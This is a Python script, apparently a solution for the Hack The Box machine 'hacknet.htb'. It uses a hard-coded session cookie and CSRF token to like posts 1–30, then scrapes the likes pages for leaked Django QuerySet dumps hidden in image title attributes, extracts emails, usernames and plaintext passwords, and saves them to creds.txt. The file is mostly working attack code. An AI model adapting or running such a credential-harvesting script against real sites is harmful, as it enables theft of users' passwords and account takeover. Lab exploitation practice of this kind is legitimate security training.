import requests
import re
from bs4 import BeautifulSoup

BASE_URL = "http://hacknet.htb"
COOKIES = {
    "sessionid": "09cmaozjwazplygr58xtxz8mkdpmo3ci",
    "csrftoken": "ZbbWHoXo2ZxfyDcsr0dWqR7zDIJX5m2r",
}
HEADERS = {
    "User-Agent": "Mozilla/4.0",
    "Referer": BASE_URL,
    "X-CSRFToken": COOKIES["csrftoken"],
}
OUTPUT_FILE = "creds.txt"

def extract_creds_from_html(html):
    """Extract credentials from <img title="...">"""
    users = []
    soup = BeautifulSoup(html, "html.parser")
    for img in soup.find_all("img"):
        title = img.get("title")
        if not title:
            continue
        
        # Look for Django QuerySet style dump
        matches = re.findall(
            r"'email': '([^']+)', 'username': '([^']+)', 'password': '([^']+)'",
            title,
        )
        for email, username, password in matches:
            users.append((email, username, password))
    return users

def save_users(users, seen):
    """Saves new users to file, skips duplicates"""
    new_lines = []
    for email, username, password in users:
        key = (email, username)
        if key not in seen:
            seen.add(key)
            new_lines.append(f"{email}:{username}:{password}")
    
    if new_lines:
        with open(OUTPUT_FILE, "a") as f:
            for line in new_lines:
                f.write(line + "\n")
        print(f"[+] Saved {len(new_lines)} new users to {OUTPUT_FILE}")

def main():
    session = requests.Session()
    session.cookies.update(COOKIES)
    session.headers.update(HEADERS)
    seen = set()
    
    for post_id in range(1, 31):  # Check posts 1-30
        like_url = f"{BASE_URL}/like/{post_id}"
        likes_url = f"{BASE_URL}/likes/{post_id}"
        
        # Like the post to appear in likers
        session.get(like_url)
        
        # Fetch the likers page
        r = session.get(likes_url)
        creds = extract_creds_from_html(r.text)
        print(f"[DEBUG] Post {post_id} → Found {len(creds)} credentials")
        save_users(creds, seen)

if __name__ == "__main__":
    main()
